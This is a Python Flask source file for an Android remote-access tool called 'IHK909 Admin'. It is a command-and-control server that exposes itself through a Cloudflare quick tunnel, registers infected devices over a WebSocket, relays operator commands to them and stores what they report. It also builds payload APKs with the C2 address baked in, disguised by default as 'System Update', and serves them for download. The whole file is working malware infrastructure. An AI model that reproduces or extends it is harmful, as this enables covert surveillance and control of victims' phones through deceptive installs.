"""IHK909 Admin — Flask + WebSocket C2 + Cloudflare Quick Tunnel."""
import os
import re
import json
import sqlite3
import time
import secrets
import uuid
import threading
import subprocess
import concurrent.futures

from flask import Flask, jsonify, request, Response, send_file
from flask_sock import Sock

app = Flask(__name__)
sock = Sock(app)

FILES_DIR = None
CACHE_DIR = None
DB_PATH = None
NATIVE_LIB_DIR = None
CLOUDFLARED_PATH = None
PUBLIC = {"http": "", "ws": ""}
CLOUDFLARED_PROC = None

AGENTS = {}
OPERATORS = set()
PENDING = {}


def _db():
    c = sqlite3.connect(DB_PATH, check_same_thread=False)
    c.row_factory = sqlite3.Row
    c.execute("PRAGMA journal_mode=WAL")
    return c


def _schema():
    c = _db()
    c.executescript("""
    CREATE TABLE IF NOT EXISTS config (k TEXT PRIMARY KEY, v TEXT);
    CREATE TABLE IF NOT EXISTS sessions (
        token TEXT PRIMARY KEY, model TEXT, brand TEXT, sdk INTEGER,
        release TEXT, pkg TEXT, first_seen REAL, last_seen REAL,
        online INTEGER DEFAULT 0, ip TEXT
    );
    CREATE TABLE IF NOT EXISTS events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT, kind TEXT, payload TEXT, ts REAL
    );
    """)
    c.commit()
    c.close()


def _cfg(k, default=""):
    c = _db()
    r = c.execute("SELECT v FROM config WHERE k=?", (k,)).fetchone()
    c.close()
    return r["v"] if r else default


def _set(k, v):
    c = _db()
    c.execute("INSERT OR REPLACE INTO config(k,v) VALUES(?,?)", (k, str(v)))
    c.commit()
    c.close()


def _broadcast(payload):
    dead = []
    for ws in list(OPERATORS):
        try:
            ws.send(json.dumps(payload, default=str))
        except Exception:
            dead.append(ws)
    for ws in dead:
        OPERATORS.discard(ws)


# ------------------- Cloudflare Tunnel -------------------
def start_cloudflare_tunnel():
    global CLOUDFLARED_PROC, PUBLIC
    if CLOUDFLARED_PROC and CLOUDFLARED_PROC.poll() is None:
        return PUBLIC["http"] or "starting"

    if not CLOUDFLARED_PATH or not os.path.exists(CLOUDFLARED_PATH):
        return None

    def run():
        global CLOUDFLARED_PROC, PUBLIC
        try:
            proc = subprocess.Popen(
                [CLOUDFLARED_PATH, "tunnel", "--url", "http://127.0.0.1:5000",
                 "--no-autoupdate"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            CLOUDFLARED_PROC = proc
            url_re = re.compile(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
            for line in iter(proc.stdout.readline, ''):
                print("[cloudflared]", line.strip())
                m = url_re.search(line)
                if m:
                    url = m.group(0)
                    PUBLIC["http"] = url
                    PUBLIC["ws"] = url.replace("https://", "wss://")
                    print(f"[cloudflared] tunnel ready: {url}")
                    break
            proc.wait()
        except Exception as e:
            print(f"[cloudflared] error: {e}")
        finally:
            PUBLIC["http"] = ""
            PUBLIC["ws"] = ""
            CLOUDFLARED_PROC = None

    threading.Thread(target=run, daemon=True).start()
    return "starting"


# ------------------- WebSocket Endpoints -------------------
@sock.route("/agent")
def agent_ws(ws):
    token = request.args.get("token", "")
    model = request.args.get("model", "")
    brand = request.args.get("brand", "")
    sdk = int(request.args.get("sdk", 0))
    release = request.args.get("release", "")
    pkg = request.args.get("pkg", "")
    ip = request.remote_addr or "?"
    now = time.time()

    c = _db()
    c.execute("""
        INSERT INTO sessions(token,model,brand,sdk,release,pkg,first_seen,last_seen,online,ip)
        VALUES(?,?,?,?,?,?,?,?,1,?)
        ON CONFLICT(token) DO UPDATE SET
          model=excluded.model, brand=excluded.brand, sdk=excluded.sdk,
          release=excluded.release, pkg=excluded.pkg, last_seen=excluded.last_seen,
          online=1, ip=excluded.ip
    """, (token, model, brand, sdk, release, pkg, now, now, ip))
    c.commit()
    c.close()

    AGENTS[token] = ws
    _broadcast({"type": "session", "token": token, "online": True,
                "model": model, "brand": brand, "sdk": sdk, "release": release})

    try:
        while True:
            raw = ws.receive()
            if raw is None:
                break
            try:
                msg = json.loads(raw)
            except Exception:
                continue

            t = msg.get("type")
            if t == "reply":
                cid = msg.get("id")
                fut = PENDING.pop(cid, None)
                if fut and not fut.done():
                    fut.set_result(msg)
            elif t == "event":
                kind = msg.get("event", "?")
                data = msg.get("data", {})
                c = _db()
                c.execute("INSERT INTO events(token,kind,payload,ts) VALUES(?,?,?,?)",
                          (token, kind, json.dumps(data), time.time()))
                c.commit()
                c.close()
                _broadcast({"type": "event", "token": token,
                            "event": kind, "data": data})
    except Exception:
        pass
    finally:
        AGENTS.pop(token, None)
        c = _db()
        c.execute("UPDATE sessions SET online=0 WHERE token=?", (token,))
        c.commit()
        c.close()
        _broadcast({"type": "session", "token": token, "online": False})


@sock.route("/operator")
def operator_ws(ws):
    OPERATORS.add(ws)
    try:
        c = _db()
        rows = [dict(r) for r in c.execute("SELECT * FROM sessions ORDER BY last_seen DESC")]
        c.close()
        for s in rows:
            ws.send(json.dumps({"type": "session", **s}, default=str))

        while True:
            raw = ws.receive()
            if raw is None:
                break
            try:
                msg = json.loads(raw)
            except Exception:
                continue

            if msg.get("type") == "cmd":
                token = msg.get("token")
                cmd = msg.get("cmd")
                args = msg.get("args") or {}
                if token not in AGENTS:
                    ws.send(json.dumps({"type": "cmd_result",
                                        "req_id": msg.get("id"),
                                        "ok": False, "error": "device offline"}))
                    continue
                cid = uuid.uuid4().hex[:12]
                fut = concurrent.futures.Future()
                PENDING[cid] = fut
                AGENTS[token].send(json.dumps({"id": cid, "cmd": cmd, "args": args}))
                try:
                    r = fut.result(timeout=90)
                    ws.send(json.dumps({"type": "cmd_result",
                                        "req_id": msg.get("id"),
                                        "ok": r.get("ok"),
                                        "data": r.get("data"),
                                        "error": r.get("error")}, default=str))
                except Exception:
                    ws.send(json.dumps({"type": "cmd_result",
                                        "req_id": msg.get("id"),
                                        "ok": False, "error": "timeout"}))
    except Exception:
        pass
    finally:
        OPERATORS.discard(ws)


# ------------------- REST API -------------------
@app.route("/")
def index():
    html_path = os.path.join(os.path.dirname(__file__), "ui", "index.html")
    with open(html_path, "r", encoding="utf-8") as f:
        return Response(f.read(), mimetype="text/html")


@app.route("/api/config", methods=["GET", "POST"])
def config():
    if request.method == "POST":
        for k, v in (request.get_json() or {}).items():
            _set(k, v)
        return jsonify(ok=True)
    return jsonify(
        c2_public=PUBLIC["http"],
        tunnel_active=bool(PUBLIC["http"])
    )


@app.route("/api/tunnel/start", methods=["POST"])
def tunnel_start():
    url = start_cloudflare_tunnel()
    if url is None:
        return jsonify(error="cloudflared binary missing"), 500
    if url == "starting":
        return jsonify(ok=True, status="starting")
    return jsonify(ok=True, url=url)


@app.route("/api/tunnel/status")
def tunnel_status():
    return jsonify(
        active=bool(PUBLIC["http"]),
        url=PUBLIC["http"],
        ws=PUBLIC["ws"]
    )


@app.route("/api/sessions")
def sessions():
    c = _db()
    rows = [dict(r) for r in c.execute("SELECT * FROM sessions ORDER BY last_seen DESC")]
    c.close()
    return jsonify(rows)


@app.route("/api/sessions/<token>/events")
def events(token):
    c = _db()
    rows = [dict(r) for r in c.execute(
        "SELECT * FROM events WHERE token=? ORDER BY id DESC LIMIT 200", (token,))]
    c.close()
    for r in rows:
        r["payload"] = json.loads(r["payload"])
    return jsonify(rows)


@app.route("/api/sessions/<token>", methods=["DELETE"])
def delete_session(token):
    c = _db()
    c.execute("DELETE FROM sessions WHERE token=?", (token,))
    c.execute("DELETE FROM events WHERE token=?", (token,))
    c.commit()
    c.close()
    return jsonify(ok=True)


@app.route("/api/build", methods=["POST"])
def build():
    d = request.get_json() or {}
    if not PUBLIC["ws"]:
        return jsonify(error="tunnel not active — start it from the Tunnel tab first"), 400
    token = secrets.token_hex(16)
    out_name = f"payload_{token}.apk"
    out_path = os.path.join(CACHE_DIR, out_name)
    try:
        from java import jclass
        PB = jclass("com.ihk909.admin.PayloadBuilder")
        ctx = jclass("com.chaquo.python.Python").getPlatform().getApplication()
        PB.build(ctx, PUBLIC["ws"], token,
                 d.get("app_name", "System Update"),
                 d.get("package_id", "com.ihk909.payload"),
                 out_path)
        return jsonify(ok=True, path=out_path, token=token, c2=PUBLIC["ws"])
    except Exception as e:
        return jsonify(error=str(e)), 502


@app.route("/api/apk/<name>")
def apk_file(name):
    p = os.path.join(CACHE_DIR, name)
    if not os.path.exists(p):
        return jsonify(error="not found"), 404
    return send_file(p, mimetype="application/vnd.android.package-archive",
                     as_attachment=True, download_name=name)


# ------------------- Startup -------------------
def start(files_dir, cache_dir):
    global FILES_DIR, CACHE_DIR, DB_PATH, NATIVE_LIB_DIR, CLOUDFLARED_PATH
    FILES_DIR = files_dir
    CACHE_DIR = cache_dir
    DB_PATH = os.path.join(files_dir, "ihk909.db")
    _schema()

    try:
        from java import jclass
        ctx = jclass("com.chaquo.python.Python").getPlatform().getApplication()
        NATIVE_LIB_DIR = ctx.getApplicationInfo().nativeLibraryDir
        CLOUDFLARED_PATH = os.path.join(NATIVE_LIB_DIR, "libcloudflared.so")
        print(f"[init] cloudflared = {CLOUDFLARED_PATH} exists={os.path.exists(CLOUDFLARED_PATH)}")
    except Exception as e:
        print(f"[init] nativeLibraryDir lookup failed: {e}")

    def run():
        app.run(host="127.0.0.1", port=5000, threaded=True,
                use_reloader=False, debug=False)

    threading.Thread(target=run, daemon=True).start()